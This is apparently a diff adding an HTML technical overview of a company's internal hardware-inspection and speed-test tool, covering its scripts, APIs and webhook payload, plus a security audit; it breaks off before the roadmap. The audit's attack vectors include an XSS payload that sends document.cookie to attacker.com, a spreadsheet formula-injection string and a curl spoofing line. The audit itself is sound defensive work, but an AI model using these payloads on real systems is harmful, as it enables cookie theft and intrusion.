@@ -1,0 +1,708 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Technical Overview — Transpro Hardware Inspection Tool</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@200;400;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --oxford:   #0D2244;
+            --metallic: #2359B3;
+            --black:    #121417;
+            --platinum: #F1F1F1;
+            --silver:   #A2A2A4;
+            --white:    #FFFFFF;
+        }
+
+        body {
+            font-family: 'Public Sans', sans-serif;
+            background: #eef1f7;
+            color: var(--black);
+            padding: 40px 20px 80px;
+            line-height: 1.7;
+        }
+
+        .wrap { max-width: 940px; margin: 0 auto; }
+
+        /* ── Header ── */
+        .header {
+            background: linear-gradient(150deg, var(--black) 0%, var(--oxford) 100%);
+            border-radius: 16px;
+            padding: 52px 52px 44px;
+            color: var(--white);
+            margin-bottom: 36px;
+            position: relative;
+            overflow: hidden;
+        }
+        .header::before {
+            content: '';
+            position: absolute;
+            top: -70px; right: -70px;
+            width: 240px; height: 240px;
+            background: rgba(35,89,179,0.18);
+            border-radius: 50%;
+        }
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: -80px; left: -40px;
+            width: 260px; height: 260px;
+            background: rgba(35,89,179,0.10);
+            border-radius: 50%;
+        }
+        .header-tag {
+            display: inline-block;
+            background: rgba(255,255,255,0.12);
+            border: 1px solid rgba(255,255,255,0.25);
+            border-radius: 20px;
+            padding: 4px 14px;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-bottom: 18px;
+        }
+        .header h1 {
+            font-size: 34px;
+            font-weight: 700;
+            line-height: 1.2;
+            margin-bottom: 10px;
+        }
+        .header p {
+            font-size: 15px;
+            color: rgba(255,255,255,0.7);
+            max-width: 620px;
+        }
+        .header-meta {
+            display: flex;
+            gap: 28px;
+            margin-top: 28px;
+            flex-wrap: wrap;
+        }
+        .meta-item { font-size: 13px; color: rgba(255,255,255,0.6); }
+        .meta-item strong { color: var(--white); display: block; font-size: 14px; }
+
+        /* ── TOC ── */
+        .toc {
+            background: var(--white);
+            border-radius: 12px;
+            padding: 28px 32px;
+            margin-bottom: 36px;
+            border-left: 4px solid var(--metallic);
+        }
+        .toc h2 { font-size: 14px; font-weight: 700; color: var(--oxford); text-transform: uppercase; letter-spacing: 0.06em; margin-bottom: 14px; }
+        .toc ol { padding-left: 18px; }
+        .toc li { margin-bottom: 6px; }
+        .toc a { color: var(--metallic); text-decoration: none; font-size: 14px; font-weight: 600; }
+        .toc a:hover { text-decoration: underline; }
+
+        /* ── Section ── */
+        .section {
+            background: var(--white);
+            border-radius: 12px;
+            padding: 36px 40px;
+            margin-bottom: 28px;
+        }
+        .section-label {
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            color: var(--metallic);
+            margin-bottom: 8px;
+        }
+        .section h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--oxford);
+            margin-bottom: 20px;
+            padding-bottom: 14px;
+            border-bottom: 2px solid var(--platinum);
+        }
+        .section h3 {
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--oxford);
+            margin: 24px 0 10px;
+        }
+        .section h4 {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--oxford);
+            margin: 16px 0 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.04em;
+        }
+        .section p { font-size: 14px; color: #444; margin-bottom: 12px; }
+        .section ul, .section ol { padding-left: 20px; margin-bottom: 14px; }
+        .section li { font-size: 14px; color: #444; margin-bottom: 6px; }
+        .section li strong { color: var(--oxford); }
+
+        /* ── Code ── */
+        code {
+            background: #eef1f7;
+            color: var(--oxford);
+            border-radius: 4px;
+            padding: 2px 7px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+        }
+        pre {
+            background: #1a1f2e;
+            color: #c9d1e0;
+            border-radius: 10px;
+            padding: 20px 24px;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            line-height: 1.7;
+            margin: 16px 0;
+        }
+        pre .comment { color: #6a7f9a; }
+        pre .key     { color: #7ec8e3; }
+        pre .val     { color: #b5e48c; }
+        pre .kw      { color: #e09ec7; }
+
+        /* ── Flow diagram ── */
+        .flow {
+            display: flex;
+            flex-direction: column;
+            gap: 0;
+            margin: 20px 0;
+        }
+        .flow-step {
+            display: flex;
+            align-items: flex-start;
+            gap: 16px;
+        }
+        .flow-line {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            flex-shrink: 0;
+        }
+        .flow-dot {
+            width: 14px; height: 14px;
+            border-radius: 50%;
+            background: var(--metallic);
+            flex-shrink: 0;
+            margin-top: 3px;
+        }
+        .flow-connector {
+            width: 2px;
+            height: 32px;
+            background: #c8d4ea;
+            margin: 2px 0;
+        }
+        .flow-body { padding-bottom: 10px; }
+        .flow-title { font-size: 14px; font-weight: 700; color: var(--oxford); }
+        .flow-detail { font-size: 13px; color: #666; margin-top: 2px; }
+
+        /* ── Table ── */
+        table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 13px; }
+        th { background: var(--oxford); color: var(--white); padding: 10px 14px; text-align: left; font-size: 12px; letter-spacing: 0.04em; }
+        td { padding: 10px 14px; border-bottom: 1px solid #e8eaf0; color: #444; vertical-align: top; }
+        tr:last-child td { border-bottom: none; }
+        tr:nth-child(even) td { background: #f7f8fb; }
+
+        /* ── Risk cards ── */
+        .risk-grid { display: flex; flex-direction: column; gap: 16px; margin-top: 8px; }
+        .risk-card {
+            border-radius: 10px;
+            padding: 20px 24px;
+            border-left: 5px solid;
+        }
+        .risk-card.high   { background: #fff4f4; border-color: #e53935; }
+        .risk-card.medium { background: #fff8f0; border-color: #fb8c00; }
+        .risk-card.low    { background: #f3f8ff; border-color: #2359B3; }
+        .risk-badge {
+            display: inline-block;
+            font-size: 10px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            padding: 3px 10px;
+            border-radius: 20px;
+            margin-bottom: 8px;
+        }
+        .risk-card.high   .risk-badge { background: #e53935; color: white; }
+        .risk-card.medium .risk-badge { background: #fb8c00; color: white; }
+        .risk-card.low    .risk-badge { background: #2359B3; color: white; }
+        .risk-card h3 { font-size: 15px; color: var(--oxford); margin-bottom: 8px; }
+        .risk-card p  { font-size: 13px; color: #555; margin-bottom: 6px; }
+
+        /* ── Improvement plan ── */
+        .plan-item {
+            display: flex;
+            gap: 16px;
+            padding: 16px 0;
+            border-bottom: 1px solid var(--platinum);
+        }
+        .plan-item:last-child { border-bottom: none; }
+        .plan-num {
+            width: 32px; height: 32px;
+            border-radius: 50%;
+            background: var(--oxford);
+            color: var(--white);
+            font-size: 13px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .plan-body h3 { font-size: 14px; font-weight: 700; color: var(--oxford); margin-bottom: 4px; }
+        .plan-body p  { font-size: 13px; color: #555; }
+
+        /* ── Footer ── */
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: var(--silver);
+            margin-top: 48px;
+        }
+    </style>
+</head>
+<body>
+<div class="wrap">
+
+    <!-- Header -->
+    <div class="header">
+        <div class="header-tag">Technical Documentation</div>
+        <h1>Hardware Inspection Tool</h1>
+        <p>Technical architecture, data flow, security vulnerabilities, and improvement roadmap for the Transpro internal IT diagnostic tool.</p>
+        <div class="header-meta">
+            <div class="meta-item"><strong>Version</strong> 2026.04 (GitHub master)</div>
+            <div class="meta-item"><strong>Author</strong> Transpro IT</div>
+            <div class="meta-item"><strong>Hosting</strong> GitHub Pages → WordPress (pending)</div>
+            <div class="meta-item"><strong>Repo</strong> Orlando-G26/Hardware-Inspection-tool</div>
+        </div>
+    </div>
+
+    <!-- TOC -->
+    <div class="toc">
+        <h2>Contents</h2>
+        <ol>
+            <li><a href="#overview">Project Overview</a></li>
+            <li><a href="#architecture">Architecture & File Structure</a></li>
+            <li><a href="#dataflow">End-to-End Data Flow</a></li>
+            <li><a href="#scripts">Platform Scripts — Technical Detail</a></li>
+            <li><a href="#apis">External API Integrations</a></li>
+            <li><a href="#browser">Browser-Side Hardware Detection</a></li>
+            <li><a href="#webhook">Power Automate Webhook Payload</a></li>
+            <li><a href="#security">Security Vulnerabilities</a></li>
+            <li><a href="#roadmap">Improvement Roadmap</a></li>
+        </ol>
+    </div>
+
+    <!-- 1. Overview -->
+    <div class="section" id="overview">
+        <div class="section-label">Section 1</div>
+        <h2>Project Overview</h2>
+        <p>The Hardware Inspection Tool is a client-side single-page web application (SPA) built in vanilla HTML/CSS/JavaScript. It collects hardware specifications and network performance metrics from employee machines and submits the results to a Microsoft Power Automate workflow via a direct HTTPS POST.</p>
+        <p>There is no backend server. All logic runs in the browser or in locally executed scripts. The tool targets Windows, macOS, Linux, Android, and iOS platforms, using platform-specific collection methods on each.</p>
+        <h3>Stack</h3>
+        <table>
+            <tr><th>Layer</th><th>Technology</th><th>Notes</th></tr>
+            <tr><td>Frontend</td><td>HTML5 / CSS3 / Vanilla JS (ES6+)</td><td>No frameworks; zero npm dependencies</td></tr>
+            <tr><td>Fonts</td><td>Google Fonts — Public Sans</td><td>Preconnect + CSS load</td></tr>
+            <tr><td>Windows collector</td><td>PowerShell 5.1+ / Batch</td><td>PS1 embedded as UTF-16LE base64 inside BAT</td></tr>
+            <tr><td>Speed test</td><td>Cloudflare speed.cloudflare.com</td><td>10 MB download, 1 MB upload, 5× ping</td></tr>
+            <tr><td>Geolocation</td><td>ipapi.co REST API</td><td>Public IP → ISP, city, region, country</td></tr>
+            <tr><td>Data storage</td><td>Microsoft Power Automate webhook → SharePoint</td><td>Direct HTTP POST, no auth token</td></tr>
+            <tr><td>Hosting</td><td>GitHub Pages (HTTPS enforced)</td><td>WordPress migration pending</td></tr>
+        </table>
+    </div>
+
+    <!-- 2. Architecture -->
+    <div class="section" id="architecture">
+        <div class="section-label">Section 2</div>
+        <h2>Architecture & File Structure</h2>
+        <table>
+            <tr><th>File</th><th>Role</th><th>Size</th></tr>
+            <tr><td><code>speedtest-webpage.html</code></td><td>Main SPA — all UI, logic, and CSS in one file. Three-screen flow: Welcome → Setup → Speed Test.</td><td>~53 KB</td></tr>
+            <tr><td><code>run-speedtest.bat</code></td><td>Windows launcher. Contains the PS1 script base64-encoded as UTF-16LE. Decodes it to <code>%TEMP%\transpro-speedtest-&lt;RANDOM&gt;.ps1</code>, executes it via PowerShell, then deletes it.</td><td>~13 KB</td></tr>
+            <tr><td><code>run-speedtest.ps1</code></td><td>Windows hardware collector (source reference). Not hosted — embedded in BAT. Uses WMI/CIM queries for CPU, RAM, OS, model; Get-NetAdapter for NIC.</td><td>~4.6 KB</td></tr>
+            <tr><td><code>run-speedtest.sh</code></td><td>Linux collector. Uses <code>/proc/cpuinfo</code>, <code>free -b</code>, <code>lsb_release</code>, <code>ip route</code>. Not required for current hosting (macOS is manual entry).</td><td>~3.4 KB</td></tr>
+            <tr><td><code>index.html</code></td><td>Redirect page. Immediately navigates to <code>speedtest-webpage.html</code> via <code>meta refresh</code> and JS fallback.</td><td>~246 B</td></tr>
+            <tr><td><code>hw-data.js</code></td><td>Optional JS object stub. Scripts can write hardware data here as <code>window._hwData</code>. The SPA reads it on load but falls back gracefully if absent.</td><td>~276 B</td></tr>
+        </table>
+
+        <h3>Screen Flow</h3>
+        <p>The SPA manages three screens using a <code>showScreen(id, stepIndex)</code> function that toggles <code>display</code> on screen divs and updates the step indicator dots.</p>
+        <table>
+            <tr><th>Screen</th><th>DOM ID</th><th>Triggered by</th></tr>
+            <tr><td>Welcome</td><td><code>screen-welcome</code></td><td>Page load</td></tr>
+            <tr><td>Setup (platform-specific)</td><td><code>screen-setup</code></td><td>"Get Started" button → <code>detectPlatform()</code></td></tr>
+            <tr><td>Speed Test</td><td><code>screen-test</code></td><td>Script completion, manual continue, or skip</td></tr>
+        </table>
+
+        <h3>Platform Detection</h3>
+        <p>Detection uses the modern <code>navigator.userAgentData.getHighEntropyValues(['platform'])</code> API with a User-Agent string regex fallback:</p>
+<pre><span class="comment">// Preferred: UACH API (Chromium-based browsers)</span>
+<span class="kw">const</span> h = <span class="kw">await</span> navigator.userAgentData.getHighEntropyValues([<span class="val">'platform'</span>]);
+<span class="comment">// Returns: 'Windows' | 'macOS' | 'Android' | 'iOS' | 'Linux'</span>
+
+<span class="comment">// Fallback: UA string regex</span>
+<span class="kw">if</span> (/Windows/.test(ua))   <span class="kw">return</span> <span class="val">'Windows'</span>;
+<span class="kw">if</span> (/iPhone|iPad/.test(ua)) <span class="kw">return</span> <span class="val">'iOS'</span>;
+<span class="kw">if</span> (/Android/.test(ua))  <span class="kw">return</span> <span class="val">'Android'</span>;
+<span class="kw">if</span> (/Mac OS X/.test(ua)) <span class="kw">return</span> <span class="val">'macOS'</span>;</pre>
+    </div>
+
+    <!-- 3. Data Flow -->
+    <div class="section" id="dataflow">
+        <div class="section-label">Section 3</div>
+        <h2>End-to-End Data Flow</h2>
+
+        <div class="flow">
+            <div class="flow-step">
+                <div class="flow-line"><div class="flow-dot"></div><div class="flow-connector"></div></div>
+                <div class="flow-body">
+                    <div class="flow-title">1 — User opens the page</div>
+                    <div class="flow-detail">Browser loads <code>speedtest-webpage.html</code>. JS checks URL params for <code>?hwready=1</code> and hardware fields (<code>cpu</code>, <code>ram</code>, <code>os</code>, <code>model</code>, <code>netType</code>, <code>netSpeed</code>). If present, populates the internal <code>_hw</code> object and shows the hardware banner.</div>
+                </div>
+            </div>
+            <div class="flow-step">
+                <div class="flow-line"><div class="flow-dot"></div><div class="flow-connector"></div></div>
+                <div class="flow-body">
+                    <div class="flow-title">2 — Platform detection & setup screen</div>
+                    <div class="flow-detail">On "Get Started", <code>detectPlatform()</code> runs and shows the matching setup div. Windows shows two options: auto-detect (BAT download) or manual entry form. macOS, Android, iOS show manual entry forms. Linux shows shell script instructions.</div>
+                </div>
+            </div>
+            <div class="flow-step">
+                <div class="flow-line"><div class="flow-dot"></div><div class="flow-connector"></div></div>
+                <div class="flow-body">
+                    <div class="flow-title">3 — Windows auto-detect path (BAT execution)</div>
+                    <div class="flow-detail">User downloads and runs <code>run-speedtest.bat</code>. The BAT calls PowerShell to decode a UTF-16LE base64 string and write it to <code>%TEMP%\transpro-speedtest-&lt;RANDOM&gt;.ps1</code>. PowerShell then executes the PS1, which collects hardware via WMI/CIM and NIC data via <code>Get-NetAdapter</code>, builds a URL-encoded query string, and opens the browser directly to <code>speedtest-webpage.html?hwready=1&amp;cpu=...&amp;ram=...&amp;os=...&amp;model=...&amp;netType=...&amp;netSpeed=...</code>. The temp PS1 is deleted after execution.</div>
+                </div>
+            </div>
+            <div class="flow-step">
+                <div class="flow-line"><div class="flow-dot"></div><div class="flow-connector"></div></div>
+                <div class="flow-body">
+                    <div class="flow-title">4 — Speed test execution</div>
+                    <div class="flow-detail">User fills in name (required), email, department, location. On submit, four async operations run in sequence: (a) <code>fetch</code> to <code>ipapi.co/json/</code> for geolocation; (b) timed <code>fetch</code> of a 10 MB file from <code>speed.cloudflare.com/__down?measId=...</code> for download speed; (c) timed <code>fetch POST</code> of a 1 MB <code>Uint8Array</code> to <code>speed.cloudflare.com/__up</code> for upload speed; (d) 5 sequential <code>Date.now()</code>-timed requests to measure ping and compute jitter as the mean absolute deviation of RTTs.</div>
+                </div>
+            </div>
+            <div class="flow-step">
+                <div class="flow-line"><div class="flow-dot"></div><div class="flow-connector"></div></div>
+                <div class="flow-body">
+                    <div class="flow-title">5 — Payload assembly</div>
+                    <div class="flow-detail">A JSON object is built combining: user-entered fields, <code>_hw</code> hardware object, speed test results, ipapi.co geolocation, browser fingerprint (<code>navigator.platform</code>, <code>navigator.hardwareConcurrency</code>, <code>navigator.deviceMemory</code>, screen resolution, timezone, browser name/version).</div>
+                </div>
+            </div>
+            <div class="flow-step">
+                <div class="flow-line"><div class="flow-dot"></div><div class="flow-connector"></div></div>
+                <div class="flow-body">
+                    <div class="flow-title">6 — Webhook POST</div>
+                    <div class="flow-detail"><code>fetch(CONFIG.webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) })</code>. On success (HTTP 200–299), results are rendered in the UI. On failure, an error message is displayed. No retry logic.</div>
+                </div>
+            </div>
+            <div class="flow-step">
+                <div class="flow-line"><div class="flow-dot"></div></div>
+                <div class="flow-body">
+                    <div class="flow-title">7 — Power Automate → SharePoint</div>
+                    <div class="flow-detail">Power Automate receives the JSON, maps fields to a SharePoint list, and writes the row. No response body is returned to the client beyond HTTP status.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 4. Scripts -->
+    <div class="section" id="scripts">
+        <div class="section-label">Section 4</div>
+        <h2>Platform Scripts — Technical Detail</h2>
+
+        <h3>Windows — BAT + Embedded PS1</h3>
+        <p>The BAT file uses PowerShell's <code>[System.IO.File]::WriteAllBytes()</code> to decode the embedded base64 string (UTF-16LE encoded PS1) directly to a temp file, bypassing all string escaping issues:</p>
+<pre><span class="kw">set</span> <span class="key">"TMP_PS1"</span>=<span class="val">%TEMP%\transpro-speedtest-%RANDOM%.ps1</span>
+powershell -ExecutionPolicy Bypass -NoProfile -Command <span class="val">"[System.IO.File]::WriteAllBytes('%TMP_PS1%', [System.Convert]::FromBase64String('&lt;base64&gt;'))"</span>
+powershell -ExecutionPolicy Bypass -NoProfile -File <span class="val">"%TMP_PS1%"</span>
+del <span class="val">"%TMP_PS1%"</span> 2&gt;nul</pre>
+
+        <p>The PS1 collects data using these WMI/CIM queries:</p>
+<pre><span class="comment"># CPU — name, core count, logical processor count</span>
+<span class="key">$cpu</span> = Get-CimInstance Win32_Processor | Select-Object -First 1
+
+<span class="comment"># RAM — sum of physical memory banks in bytes → rounded to GB</span>
+<span class="key">$ramBytes</span> = (Get-CimInstance Win32_PhysicalMemory | Measure-Object Capacity -Sum).Sum
+
+<span class="comment"># OS — caption string + build number</span>
+<span class="key">$os</span> = Get-CimInstance Win32_OperatingSystem
+
+<span class="comment"># Model — manufacturer + model string from ComputerSystem</span>
+<span class="key">$cs</span> = Get-CimInstance Win32_ComputerSystem
+
+<span class="comment"># NIC — first non-virtual, active adapter, sorted by link speed</span>
+<span class="key">$adapter</span> = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.Virtual -eq $false } | Sort-Object LinkSpeed -Descending | Select-Object -First 1
+
+<span class="comment"># Wi-Fi detection — PhysicalMediaType or InterfaceDescription regex</span>
+<span class="key">$isWifi</span> = $adapter.PhysicalMediaType -eq 'Native 802.11' -or $adapter.InterfaceDescription -match 'Wi.?Fi|Wireless|802\.11'
+
+<span class="comment"># SSID + signal strength via netsh</span>
+<span class="key">$wlan</span> = (netsh wlan show interfaces) -join "`n"</pre>
+
+        <h3>Linux — Shell Script</h3>
+        <p>The shell script (<code>run-speedtest.sh</code>) uses native Unix tools:</p>
+<pre><span class="comment"># CPU model</span>
+grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | xargs
+
+<span class="comment"># RAM total in GB</span>
+awk '/MemTotal/ { printf "%.0f GB", $2/1024/1024 }' /proc/meminfo
+
+<span class="comment"># OS description</span>
+lsb_release -ds 2>/dev/null || cat /etc/os-release | grep PRETTY_NAME
+
+<span class="comment"># Active NIC name via default route</span>
+ip route | awk '/default/ { print $5; exit }'</pre>
+
+        <h3>macOS, Android, iOS — Manual Entry</h3>
+        <p>No scripts are executed. The user is shown a reference card illustrating where to find the data on their device, then fills in a form. On "Continue", the form values are written directly into the <code>_hw</code> JavaScript object in memory before navigating to the speed test screen.</p>
+    </div>
+
+    <!-- 5. APIs -->
+    <div class="section" id="apis">
+        <div class="section-label">Section 5</div>
+        <h2>External API Integrations</h2>
+
+        <h3>Cloudflare Speed Test Endpoints</h3>
+        <table>
+            <tr><th>Test</th><th>Endpoint</th><th>Method</th><th>Detail</th></tr>
+            <tr><td>Download</td><td><code>speed.cloudflare.com/__down?measId=&lt;id&gt;</code></td><td>GET</td><td>10 MB response body. Speed = <code>(10 * 8) / elapsed_seconds</code> Mbps. Measured via <code>performance.now()</code>.</td></tr>
+            <tr><td>Upload</td><td><code>speed.cloudflare.com/__up</code></td><td>POST</td><td>1 MB <code>Uint8Array</code> body. Speed = <code>(1 * 8) / elapsed_seconds</code> Mbps.</td></tr>
+            <tr><td>Ping / Jitter</td><td><code>speed.cloudflare.com/__down?measId=&lt;id&gt;</code></td><td>GET</td><td>5 sequential requests, minimal payload. RTT array → avg ping; jitter = mean absolute deviation of RTTs.</td></tr>
+        </table>
+
+        <h3>ipapi.co Geolocation</h3>
+        <p>Single GET request to <code>https://ipapi.co/json/</code>. Returns JSON with the following fields used by the tool:</p>
+<pre>{
+  <span class="key">"ip"</span>:         <span class="val">"203.0.113.45"</span>,
+  <span class="key">"city"</span>:       <span class="val">"Montreal"</span>,
+  <span class="key">"region"</span>:     <span class="val">"Quebec"</span>,
+  <span class="key">"country_name"</span>: <span class="val">"Canada"</span>,
+  <span class="key">"org"</span>:        <span class="val">"AS577 Bell Canada"</span>
+}</pre>
+        <p>The <code>ip</code> and <code>org</code> fields are inserted into the DOM using <code>innerHTML</code> (see Security section §1).</p>
+
+        <h3>Power Automate Webhook</h3>
+        <p>HTTP POST to the hardcoded <code>CONFIG.webhookURL</code>. The endpoint is a Microsoft Power Automate instant flow with an HTTP trigger. Headers: <code>Content-Type: application/json</code>. No authentication token. See Section 7 for full payload schema.</p>
+    </div>
+
+    <!-- 6. Browser HW Detection -->
+    <div class="section" id="browser">
+        <div class="section-label">Section 6</div>
+        <h2>Browser-Side Hardware Detection</h2>
+        <p>When no script is run (manual path or skip), the browser collects a partial hardware fingerprint using these APIs:</p>
+        <table>
+            <tr><th>Field</th><th>API</th><th>Limitation</th></tr>
+            <tr><td>OS / Platform</td><td><code>navigator.userAgentData.getHighEntropyValues(['platform','platformVersion'])</code></td><td>Chromium only; Safari/Firefox use UA string fallback</td></tr>
+            <tr><td>CPU Cores</td><td><code>navigator.hardwareConcurrency</code></td><td>Returns logical core count only</td></tr>
+            <tr><td>RAM</td><td><code>navigator.deviceMemory</code></td><td>Capped at 8 GB by spec; returns nearest power of 2</td></tr>
+            <tr><td>Screen</td><td><code>screen.width × screen.height</code></td><td>Physical pixels, not DPI-adjusted</td></tr>
+            <tr><td>Timezone</td><td><code>Intl.DateTimeFormat().resolvedOptions().timeZone</code></td><td>IANA timezone string</td></tr>
+            <tr><td>Browser</td><td>UA string regex</td><td>Edge, Opera, Chrome, Firefox, Safari detected</td></tr>
+        </table>
+        <p>CPU model name and exact RAM are only available via the PowerShell or shell scripts. All browser-collected values go into the <code>_hw</code> object as fallback fields.</p>
+    </div>
+
+    <!-- 7. Payload -->
+    <div class="section" id="webhook">
+        <div class="section-label">Section 7</div>
+        <h2>Power Automate Webhook Payload</h2>
+        <p>Full JSON schema of the object POSTed to the webhook on every submission:</p>
+<pre>{
+  <span class="comment">// User-entered</span>
+  <span class="key">"name"</span>:         <span class="val">"John Smith"</span>,
+  <span class="key">"email"</span>:        <span class="val">"jsmith@trans-pro.com"</span>,
+  <span class="key">"department"</span>:   <span class="val">"Operations"</span>,
+  <span class="key">"location"</span>:     <span class="val">"Montreal"</span>,
+
+  <span class="comment">// Speed test results</span>
+  <span class="key">"downloadMbps"</span>: <span class="val">94.3</span>,
+  <span class="key">"uploadMbps"</span>:   <span class="val">22.1</span>,
+  <span class="key">"pingMs"</span>:       <span class="val">18</span>,
+  <span class="key">"jitterMs"</span>:     <span class="val">3.2</span>,
+
+  <span class="comment">// Geolocation (ipapi.co)</span>
+  <span class="key">"publicIP"</span>:     <span class="val">"203.0.113.45"</span>,
+  <span class="key">"isp"</span>:          <span class="val">"AS577 Bell Canada"</span>,
+  <span class="key">"city"</span>:         <span class="val">"Montreal"</span>,
+  <span class="key">"region"</span>:       <span class="val">"Quebec"</span>,
+  <span class="key">"country"</span>:      <span class="val">"Canada"</span>,
+
+  <span class="comment">// Hardware (script or manual)</span>
+  <span class="key">"cpu"</span>:          <span class="val">"Intel Core i7-1165G7 (4C / 8T)"</span>,
+  <span class="key">"ram"</span>:          <span class="val">"16 GB"</span>,
+  <span class="key">"os"</span>:           <span class="val">"Windows 11 Pro (Build 22621)"</span>,
+  <span class="key">"model"</span>:        <span class="val">"Dell Inc. Latitude 5520"</span>,
+  <span class="key">"netType"</span>:      <span class="val">"Wi-Fi - CorpNet (92% signal)"</span>,
+  <span class="key">"netSpeed"</span>:     <span class="val">"1 Gbps"</span>,
+
+  <span class="comment">// Browser fingerprint</span>
+  <span class="key">"browser"</span>:      <span class="val">"Edge 124"</span>,
+  <span class="key">"platform"</span>:     <span class="val">"Windows 11"</span>,
+  <span class="key">"cores"</span>:        <span class="val">8</span>,
+  <span class="key">"deviceMemory"</span>: <span class="val">"8 GB"</span>,
+  <span class="key">"screen"</span>:       <span class="val">"1920x1080"</span>,
+  <span class="key">"timezone"</span>:     <span class="val">"America/Toronto"</span>,
+  <span class="key">"timestamp"</span>:    <span class="val">"2026-04-17T14:32:00.000Z"</span>
+}</pre>
+    </div>
+
+    <!-- 8. Security -->
+    <div class="section" id="security">
+        <div class="section-label">Section 8</div>
+        <h2>Security Vulnerabilities</h2>
+
+        <div class="risk-grid">
+
+            <div class="risk-card high">
+                <span class="risk-badge">High</span>
+                <h3>1 — Webhook URL Exposed in Client Source</h3>
+                <p><strong>Location:</strong> <code>speedtest-webpage.html</code> — <code>CONFIG.webhookURL</code>, visible in browser DevTools.</p>
+                <p><strong>Impact:</strong> Any person who opens the page can extract the full Power Automate endpoint URL and POST arbitrary JSON payloads to it — spoofing results, flooding the SharePoint list, or probing the flow for further exploitation. No network access beyond the public URL is required.</p>
+                <p><strong>Attack vector:</strong> Browser DevTools → Sources → copy <code>CONFIG.webhookURL</code> → <code>curl -X POST &lt;url&gt; -d '{"name":"fake",...}'</code></p>
+            </div>
+
+            <div class="risk-card high">
+                <span class="risk-badge">High</span>
+                <h3>2 — No Submission Authentication</h3>
+                <p><strong>Location:</strong> Form submission logic — no token, session, or identity check of any kind.</p>
+                <p><strong>Impact:</strong> Anyone — internal or external — can submit a result with any name, email, and data values. There is no way to distinguish a legitimate submission from a fabricated one in the SharePoint list.</p>
+            </div>
+
+            <div class="risk-card high">
+                <span class="risk-badge">High</span>
+                <h3>3 — XSS via innerHTML with Third-Party API Data</h3>
+                <p><strong>Location:</strong> <code>displayResults()</code> function — ipapi.co fields (<code>ip</code>, <code>org</code>, <code>city</code>, <code>region</code>, <code>country_name</code>) inserted via <code>innerHTML</code>.</p>
+                <p><strong>Impact:</strong> If ipapi.co is compromised or the response is intercepted (MITM on HTTP), a crafted API response containing <code>&lt;script&gt;</code> tags or event handler attributes executes arbitrary JavaScript in the user's browser under the page's origin.</p>
+                <p><strong>Attack vector:</strong> DNS spoofing or BGP hijack of ipapi.co → inject <code>&lt;img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)"&gt;</code> into <code>org</code> field.</p>
+            </div>
+
+            <div class="risk-card medium">
+                <span class="risk-badge">Medium</span>
+                <h3>4 — No Rate Limiting</h3>
+                <p><strong>Location:</strong> Submit button — disabled only during test execution; trivially bypassed via DevTools or scripted requests.</p>
+                <p><strong>Impact:</strong> The webhook and SharePoint list can be flooded with automated submissions, exhausting Power Automate run limits or filling the SharePoint list with noise.</p>
+            </div>
+
+            <div class="risk-card medium">
+                <span class="risk-badge">Medium</span>
+                <h3>5 — No Input Validation or Sanitization</h3>
+                <p><strong>Location:</strong> Name, email, department, location fields — sent raw to the webhook.</p>
+                <p><strong>Impact:</strong> Formula injection into SharePoint/Excel if the data is exported to a spreadsheet (e.g., <code>=CMD|'/c calc'!A1</code> in the name field). Also enables stored XSS if results are ever rendered back in a web interface.</p>
+            </div>
+
+            <div class="risk-card medium">
+                <span class="risk-badge">Medium</span>
+                <h3>6 — Third-Party Data Dependency (ipapi.co)</h3>
+                <p><strong>Location:</strong> <code>https://ipapi.co/json/</code> called client-side on every submission.</p>
+                <p><strong>Impact:</strong> Every user's public IP address is sent to an external third-party service with no data processing agreement. Service downtime causes the speed test to fail or produce incomplete results. No control over retention or use of IP data.</p>
+            </div>
+
+            <div class="risk-card medium">
+                <span class="risk-badge">Medium</span>
+                <h3>7 — No Privacy / Data Consent Notice</h3>
+                <p><strong>Location:</strong> Entire application — no disclosure of data collected.</p>
+                <p><strong>Impact:</strong> The tool collects name, email, public IP, ISP, physical location, device hardware specs, and browser fingerprint without informing users or obtaining consent. Non-compliant with PIPEDA (Canada) and potentially GDPR if used across borders.</p>
+            </div>
+
+            <div class="risk-card low">
+                <span class="risk-badge">Low</span>
+                <h3>8 — No Content Security Policy (CSP)</h3>
+                <p><strong>Location:</strong> No <code>Content-Security-Policy</code> HTTP header or meta tag.</p>
+                <p><strong>Impact:</strong> Without a CSP, an XSS attack (see §3) can load external scripts, exfiltrate data, or modify the DOM with no additional barrier. Increases blast radius of any injected script.</p>
+            </div>
+
+            <div class="risk-card low">
+                <span class="risk-badge">Low</span>
+                <h3>9 — PowerShell Execution Policy Bypass</h3>
+                <p><strong>Location:</strong> <code>run-speedtest.bat</code> — <code>-ExecutionPolicy Bypass</code> flag.</p>
+                <p><strong>Impact:</strong> The BAT instructs PowerShell to ignore the system execution policy, allowing unsigned scripts to run. If the BAT file itself is tampered with (e.g., supply chain via compromised hosting), the PS1 payload runs with user-level permissions without any OS-level script signing check.</p>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- 9. Roadmap -->
